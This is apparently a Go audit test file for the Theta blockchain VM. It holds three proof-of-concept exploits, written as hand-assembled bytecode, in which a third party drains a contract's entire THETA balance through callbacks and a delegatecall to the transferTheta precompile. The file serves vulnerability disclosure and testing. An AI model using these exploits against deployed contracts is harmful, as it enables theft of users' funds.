package vm

// AUDIT PoC B - NEW: "callback identity leak".
//
// Any contract V that performs an outgoing call to an address influenced by its
// caller (a user-supplied target, msg.sender, a hook, an oracle probe, ...)
// hands that address a frame whose CallerAddress is V. A delegatecall to the
// transferTheta precompile (0xCB) inside that frame therefore debits V, not the
// caller. Consequence: ANY third party can drain 100% of V's THETA balance with
// one ordinary transaction - no signature, allowance or cooperation from V's
// owner is required (contrast with finding #23, which needs the victim to sign
// a transaction that reaches attacker code).

import (
	"encoding/hex"
	"math/big"
	"testing"

	"github.com/thetatoken/theta/common"
	"github.com/thetatoken/theta/ledger/types"
)

// ---------------------------------------------------------------------------
// tiny assembler (needed for the dispatcher variant)
// ---------------------------------------------------------------------------

type assembler struct{ b []byte }

func (a *assembler) raw(h string) *assembler {
	d, err := hex.DecodeString(h)
	if err != nil {
		panic(err)
	}
	a.b = append(a.b, d...)
	return a
}
func (a *assembler) push1(v byte) *assembler { a.b = append(a.b, 0x60, v); return a }
func (a *assembler) push20(v common.Address) *assembler {
	a.b = append(a.b, 0x73)
	a.b = append(a.b, v.Bytes()...)
	return a
}

// victimCallbackToCalldata: V calls the address given in calldata[0:32] with all
//
//	CALLDATACOPY(mem 0, data 0, len 32)     6020 6000 6000 37
//	CALL(gas, mload(0), 0,0,0,0)           6000 6000 6000 6000 6000 51 5a f1 00
func victimCallbackToCalldata() string {
	return "60206000600037" + "6000" + "6000" + "6000" + "6000" + "6000" + "6000" + "51" + "5a" + "f1" + "00"
}

// victimCallbackToSender: V calls msg.sender (CALLER) with all gas
//
//	CALL(gas, CALLER, 0,0,0,0)             6000 6000 6000 6000 33 5a f1 00
func victimCallbackToSender() string {
	return "6000" + "6000" + "6000" + "6000" + "6000" + "33" + "5a" + "f1" + "00"
}

// victimStaticProbeOfCalldata: V performs a *read-only* STATICCALL into the address
// given in calldata[0:32] (ERC-165 / oracle / "is this a contract" probe pattern)
func victimStaticProbeOfCalldata() string {
	return "60206000600037" + "6000" + "6000" + "6000" + "6000" + "6000" + "51" + "5a" + "fa" + "00"
}

// initiatorDispatcher: a middleman contract. When called by V it runs the drainer,
// otherwise it just calls V (this is what a smart-contract-wallet front-end does).
func initiatorDispatcher(victim common.Address, drainerHex string) []byte {
	drain, err := hex.DecodeString(drainerHex)
	if err != nil {
		panic(err)
	}
	a := &assembler{}
	// if CALLER == victim -> jump to drainer
	a.raw("33").push20(victim).raw("14")
	pushIdx := len(a.b)
	a.push1(0) // patched below
	a.raw("57") // JUMPI
	// fallthrough: CALL(gas, victim, 0, 0, 0, 0)
	a.raw("6000" + "6000" + "6000" + "6000" + "6000").push20(victim).raw("5a" + "f1" + "50" + "00")
	a.b[pushIdx+1] = byte(len(a.b)) // JUMPDEST offset
	a.raw("5b")                     // JUMPDEST
	a.b = append(a.b, drain...)
	return a.b
}

// ---------------------------------------------------------------------------
// PoC B1: victim contract calls a *caller supplied* target
// ---------------------------------------------------------------------------

func TestAuditB1_ThirdPartyDrainsContract_CallbackTarget(t *testing.T) {
	sv := newAuditView(t)

	setBalance(t, sv, victimCtr, thetaN(100), big.NewInt(0))      // contract holds 100 THETA
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))  // attacker holds nothing
	setCode(t, sv, attackerCtr, drainerRuntime(attackerEOA))      // attacker payload
	setCode(t, sv, victimCtr, victimCallbackToCalldata())         // innocent victim contract

	// The attacker sends ONE ordinary transaction to the victim contract and
	// passes its own contract address as the callback target.
	calldata := leftPadAddr(attackerCtr)
	if _, err := runTx(t, sv, attackerEOA, victimCtr, calldata, 2_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	t.Logf("victim contract theta : %v", thetaOf(sv, victimCtr))
	t.Logf("attacker EOA theta    : %v", thetaOf(sv, attackerEOA))

	if thetaOf(sv, victimCtr).Sign() != 0 {
		t.Fatalf("expected victim contract drained, got %v", thetaOf(sv, victimCtr))
	}
	if thetaOf(sv, attackerEOA).Cmp(thetaN(100)) != 0 {
		t.Fatalf("expected attacker to receive 100 theta, got %v", thetaOf(sv, attackerEOA))
	}
}

// ---------------------------------------------------------------------------
// PoC B2: victim contract calls msg.sender (refund / hook / callback pattern)
// ---------------------------------------------------------------------------

func TestAuditB2_ThirdPartyDrainsContract_CallbackToSender(t *testing.T) {
	sv := newAuditView(t)

	setBalance(t, sv, victimCtr, thetaN(250), big.NewInt(0))
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))
	setCode(t, sv, victimCtr, victimCallbackToSender())

	dispatcher := initiatorDispatcher(victimCtr, drainerRuntime(attackerEOA))
	sv.SetCode(helperCtr, dispatcher)
	setBalance(t, sv, helperCtr, big.NewInt(0), big.NewInt(0))

	// attacker -> middleman -> victim -> (callback to msg.sender = middleman)
	if _, err := runTx(t, sv, attackerEOA, helperCtr, nil, 3_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	t.Logf("victim contract theta : %v", thetaOf(sv, victimCtr))
	t.Logf("attacker EOA theta    : %v", thetaOf(sv, attackerEOA))

	if thetaOf(sv, victimCtr).Sign() != 0 {
		t.Fatalf("expected victim contract drained, got %v", thetaOf(sv, victimCtr))
	}
	if thetaOf(sv, attackerEOA).Cmp(thetaN(250)) != 0 {
		t.Fatalf("expected attacker to receive 250 theta, got %v", thetaOf(sv, attackerEOA))
	}
}

// ---------------------------------------------------------------------------
// PoC B3: the victim contract only performs a *read-only* STATICCALL
// ---------------------------------------------------------------------------

func TestAuditB3_ThirdPartyDrainsContract_StaticProbe(t *testing.T) {
	sv := newAuditView(t)

	setBalance(t, sv, victimCtr, thetaN(500), big.NewInt(0))
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))
	setCode(t, sv, attackerCtr, staticDrainerRuntime(attackerEOA))
	setCode(t, sv, victimCtr, victimStaticProbeOfCalldata())

	calldata := leftPadAddr(attackerCtr)
	if _, err := runTx(t, sv, attackerEOA, victimCtr, calldata, 2_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	t.Logf("victim contract theta : %v", thetaOf(sv, victimCtr))
	t.Logf("attacker EOA theta    : %v", thetaOf(sv, attackerEOA))

	if thetaOf(sv, victimCtr).Sign() != 0 {
		t.Fatalf("expected victim contract drained through STATICCALL, got %v", thetaOf(sv, victimCtr))
	}
	if thetaOf(sv, attackerEOA).Cmp(thetaN(500)) != 0 {
		t.Fatalf("expected attacker to receive 500 theta, got %v", thetaOf(sv, attackerEOA))
	}
}

func leftPadAddr(a common.Address) []byte {
	out := make([]byte, 32)
	copy(out[12:], a.Bytes())
	return out
}

var _ = types.Coins{}
